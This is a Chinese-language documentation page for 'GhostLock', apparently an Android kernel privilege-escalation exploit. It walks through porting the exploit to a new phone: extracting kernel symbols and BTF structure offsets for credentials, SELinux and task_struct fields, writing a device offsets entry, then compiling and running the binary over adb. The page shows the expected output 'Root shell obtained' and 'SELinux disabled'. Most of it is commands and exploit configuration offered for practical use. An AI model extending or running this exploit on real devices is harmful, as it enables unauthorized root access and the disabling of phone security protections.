---
title: 添加新设备
description: 如何为 GhostLock 添加新设备支持
---

## 概述

添加新设备支持需要完成以下步骤：

1. 提取内核镜像
2. 解析 kallsyms 符号表
3. 提取 BTF 结构体信息
4. 确定内存布局
5. 创建设备条目
6. 注册设备
7. 测试验证

## 步骤 1：提取内核镜像

### 方法 A：从手机提取

```bash
# 查看分区列表
adb shell ls -la /dev/block/by-name/
adb shell cat /proc/partitions

# 提取 boot 分区
adb pull /dev/block/by-name/boot boot.img

# 查看内核版本
adb shell cat /proc/version
adb shell uname -a
```

### 方法 B：从固件包提取

```bash
# 解包固件（使用 payload-dumper-go）
payload-dumper-go -o extracted firmware.bin

# 查看输出
ls extracted/
# 输出: boot.img, init_boot.img, vendor_boot.img, dtbo.img
```

### 方法 C：使用 vmlinux-to-elf

```bash
# 安装工具
pip install vmlinux-to-elf

# 从 boot.img 提取内核
python3 -m vmlinux_to_elf boot.img
# 选择 "Extract kallsyms" 选项
# 输出: boot.img.elf
```

## 步骤 2：提取 kallsyms

### 使用 vmlinux-to-elf

```bash
# 提取 kallsyms
python3 -m vmlinux_to_elf extracted/Image.bin

# 或者使用 run_kallsyms_finder.py
python3 tools/run_kallsyms_finder.py extracted/Image.bin > kallsyms.txt

# 查看输出
head -10 kallsyms.txt
# 输出格式: 地址 类型 符号名
# ffffffc080000000 T _text
# ffffffc080000000 T _stext
# ffffffc080000800 T _etext
```

### 提取关键符号

```bash
# 搜索关键符号
grep -E "(init_task|init_cred|init_uts_ns|empty_zero_page|root_task_group|selinux_state|kptr_restrict|selinux_blob_sizes|security_hook_heads|kmalloc_caches|anon_pipe_buf_ops|ashmem|nfulnl_logger|loggers|sysctl_bootid)" kallsyms.txt

# 示例输出：
# ffffffc0800211e280 D init_task
# ffffffc08002130748 D init_cred
# ffffffc080022a3448 D init_uts_ns
# ffffffc0800230f000 D empty_zero_page
# ffffffc08002317580 D root_task_group
```

### 计算偏移量

```bash
# 找到 KIMAGE_TEXT_BASE
grep " _text" kallsyms.txt | head -1

# 偏移量 = 符号地址 - KIMAGE_TEXT_BASE
# 例如: init_task 偏移 = 0xffffffc0800211e280 - 0xffffffc080000000 = 0x211e280
```

## 步骤 3：提取 BTF 信息

### 使用 BTF 解析脚本

```bash
# 提取 task_struct
python3 tools/btf_task2.py > task_struct.txt

# 提取关键结构体
python3 tools/btf_structs2.py > structs.txt

# 提取 selinux 相关
python3 tools/btf_selinux.py > selinux.txt

# 提取 mm_struct
python3 tools/btf_mm.py > mm.txt
```

### 查看输出

```bash
# task_struct 输出格式：
# [  0] thread_info    off=0x0000
# [  1] __state        off=0x0030
# [ 15] prio           off=0x0084
# [113] real_cred      off=0x0818
# [114] cred           off=0x0820

# 记录关键字段偏移
# task_usage=0x40
# task_prio=0x84
# task_normal_prio=0x8C
# task_pi_lock=0x90C
# task_pi_waiters=0x920
# task_pid=0x618
# task_tgid=0x61C
# task_real_parent=0x628
# task_atomic_flags=0x5D8
# task_real_cred=0x818
# task_cred=0x820
# task_comm=0x830
# task_tasks=0x550
# task_seccomp=0x8E8
```

## 步骤 4：确定内存布局

### 查看内核配置

```bash
# 提取内核配置
python3 extract-ikconfig extracted/Image.bin > config.txt

# 查看关键配置
grep -E "(CONFIG_ARM64_VA_BITS|CONFIG_PAGE_SIZE|CONFIG_PHYS_OFFSET|CONFIG_RANDOMIZE_BASE|CONFIG_ARM64_4K_PAGES)" config.txt

# 示例输出：
# CONFIG_ARM64_VA_BITS=39
# CONFIG_PAGE_SIZE_4KB=y
# CONFIG_RANDOMIZE_BASE=y
```

### 内存布局参数

```bash
# PAGE_OFFSET 由 VA_BITS 决定
# VA_BITS=39 → PAGE_OFFSET=0xffffffc000000000
# VA_BITS=48 → PAGE_OFFSET=0xffff800000000000

# PHYS_OFFSET 由设备内存布局决定
# MTK: 通常为 0x40000000
# Qualcomm: 通常为 0x80000000

# KIMAGE_TEXT_BASE 由 _text 符号决定
# = kallsyms 中 _text 的地址
```

## 步骤 5：创建设备条目

### 创建设备目录

```bash
mkdir -p src/devices/mydevice
```

### 创建设备条目文件

创建 `src/devices/mydevice/offsets.h`：

```c
/* MyDevice 设备条目
 * 设备: 厂商 型号
 * 芯片组: XXX
 * 内核版本: 6.x.x-androidXX
 */

OFFSETS_ENTRY("6.x.x-androidXX",
  /* 内存布局 */
  .kimage_text_base=0xffffffc000000000ULL,
  .p0_page_offset=0xffffffc000000000ULL,
  .p0_phys_offset=0x40000000ULL,
  .p0_kernel_phys_load=0xC0000000ULL,
  .kernelsnitch_identity_start=0xffffffc000000000ULL,
  .kernelsnitch_identity_end=0xffffffc400000000ULL,
  .direct_map_end=0xffffffc400000000ULL,

  /* 全局符号 */
  .off_init_task=0x0211E280,
  .off_init_cred=0x02130748,
  .off_init_uts_ns=0x022A3448,
  .off_empty_zero_page=0x0230F000,
  .off_root_task_group=0x02317580,
  .off_selinux_enforcing=0x02358EE0,
  .off_kptr_restrict=0x0211BCF8,
  .off_selinux_blob_sizes=0x0167AE90,
  .off_security_hook_heads=0x0167A758,
  .off_kmalloc_caches=0x0167A298,
  .off_anon_pipe_buf_ops=0x0116E848,
  .off_ashmem_misc_fops=0x0227C528,
  .off_ashmem_fops=0x012EF5C0,

  /* task_struct */
  .task_usage=0x40,
  .task_prio=0x84,
  .task_normal_prio=0x8C,
  .task_sched_task_group=0x348,
  .task_pi_lock=0x90C,
  .task_pi_waiters=0x920,
  .task_pi_top_task=0x930,
  .task_pi_blocked_on=0x938,
  .task_pid=0x618,
  .task_tgid=0x61C,
  .task_real_parent=0x628,
  .task_atomic_flags=0x5D8,
  .task_real_cred=0x818,
  .task_cred=0x820,
  .task_comm=0x830,
  .task_tasks=0x550,
  .task_seccomp=0x8E8,

  /* rt_mutex_waiter */
  .waiter_tree=0x00,
  .waiter_pi_tree=0x28,
  .waiter_task=0x50,
  .waiter_lock=0x58,
  .waiter_wake_state=0x60,
  .waiter_prio=0x18,
  .waiter_deadline=0x20,
  .waiter_ww_ctx=0x68,
  .waiter_pi_tree_prio=0x40,
  .waiter_pi_tree_deadline=0x48,

  /* cred */
  .cred_uid=0x08,
  .cred_securebits=0x28,
  .cred_caps=0x30,
  .cred_security=0x80,

  /* file_operations */
  .fops_owner=0x00,
  .fops_llseek=0x08,
  .fops_read=0x10,
  .fops_write=0x18,
  .fops_read_iter=0x20,
  .fops_write_iter=0x28,
  .fops_ioctl=0x48,
  .fops_compat_ioctl=0x50,
  .fops_mmap=0x58,
  .fops_open=0x68,
  .fops_release=0x78,
  .fops_splice_read=0xB8,
  .fops_show_fdinfo=0xD8,

  .mm_struct_sz=0x4C0,

  .pselect_waiter_word_shift=0,
  PSELECT_WORDS_6_12
),
```

### 选择 PSELECT 表

根据内核版本选择正确的 PSELECT 表：

| 内核版本 | PSELECT 表 | waiter 布局 |
|----------|-----------|------------|
| 6.1 | PSELECT_WORDS_6_1 | 旧版 rb_node |
| 6.12 | PSELECT_WORDS_6_12 | 新版 rt_waiter_node |

## 步骤 6：注册设备

### 添加包含

编辑 `src/devices/offsets.h`：

```c
static const struct kernel_offsets known_offsets[] = {
#include "ace6t/offsets.h"
#include "op15/offsets.h"
#include "rmx5070/offsets.h"
#include "opd2502/offsets.h"
#include "findx8/offsets.h"
#include "mydevice/offsets.h"    // ← 添加这一行
  { .uname_r = NULL }
};
```

## 步骤 7：编译测试

### 编译

```bash
# 设置 NDK 路径
export ANDROID_NDK_HOME=/path/to/android-ndk-r27c

# 编译
make clean
make
```

### 检查编译错误

```bash
# 检查是否有未定义的符号
make 2>&1 | grep -E "(error|warning)"

# 检查 findx8 条目是否被正确包含
nm ghostlock | grep -i "offsets"
```

### 本地测试

```bash
# 推送到手机
adb push ghostlock /data/local/tmp/
adb shell chmod 755 /data/local/tmp/ghostlock

# 运行（应该输出找到设备条目的信息）
adb shell /data/local/tmp/ghostlock
```

## 测试验证

### 成功标志

```bash
# 1. 识别到设备
[*] Found device: MyDevice
[*] Kernel: 6.x.x-androidXX

# 2. 符号解析成功
[*] init_task: 0xffffffc0xxxxxxx
[*] init_cred: 0xffffffc0xxxxxxx

# 3. 提权成功
[+] Root shell obtained!
[+] SELinux disabled
```

### 调试

如果 exploit 失败，检查：

1. **偏移量是否正确** - 使用 BTF 脚本重新提取
2. **符号地址是否正确** - 检查 kallsyms 偏移计算
3. **内存布局是否正确** - 检查 PAGE_OFFSET 和 PHYS_OFFSET
4. **PSELECT 表是否正确** - 根据内核版本选择

## 提交设备支持

完成测试后，可以提交设备支持到项目：

1. Fork 仓库
2. 创建分支：`git checkout -b add-mydevice`
3. 提交设备条目
4. 推送并创建 PR
5. 等待代码审查

参考 [贡献指南]({{ '/contributing' | relative_url }}) 了解更多信息。

## 相关链接

- [支持的设备]({{ '/devices' | relative_url }})
- [编译指南]({{ '/compilation' | relative_url }})
- [工具脚本]({{ '/tools' | relative_url }})
